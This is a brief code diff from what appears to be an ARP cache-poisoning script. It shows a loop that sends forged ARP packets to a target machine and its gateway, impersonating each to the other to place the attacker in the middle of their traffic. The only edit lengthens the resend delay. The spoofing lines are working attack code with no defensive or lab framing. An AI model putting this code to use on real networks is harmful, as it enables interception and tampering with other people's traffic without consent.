@@ -21,7 +21,7 @@ try:
 		#hwdst is the actual recepient of the ARP packet, src is where the requests want to go, dst is where they end up
 		net.send(net.ARP(op="who-has", hwdst=machines["target"].mac, pdst=machines["target"].ip, psrc=machines["gateway"].ip), verbose=VERBOSITY)
 		net.send(net.ARP(op="who-has", hwdst=machines["gateway"].mac, pdst=machines["gateway"].ip, psrc=machines["target"].ip), verbose=VERBOSITY)
-		time.sleep(2) #typically kept in the ARP cache for 60s
+		time.sleep(5) #typically kept in the ARP cache for 60s
 
 except KeyboardInterrupt:
 	pass
